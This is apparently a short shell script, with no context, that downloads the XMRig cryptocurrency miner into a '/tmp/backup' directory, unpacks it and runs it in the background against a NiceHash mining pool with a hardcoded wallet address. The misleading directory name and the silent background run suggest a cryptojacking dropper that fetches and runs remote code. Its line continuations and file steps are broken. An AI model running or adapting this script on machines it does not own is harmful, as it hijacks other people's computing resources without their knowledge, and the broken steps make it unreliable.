mkdir /tmp/backup \

cd /tmp/backup \

chmod 774 dan.sh	\

wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-bionic-x64.tar.gz  \

tar -zxf xmrig-6.20.0-bionic-x64.tar.gz   \

rm -rf xmrig-6.20.0-bionic-x64.tar.gz.1 \

cd xmrig-6.20.0	\

./xmrig -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbLJ5nkhrJtgFjxUk85qr43rEGHPSLBjahs -p x -B \
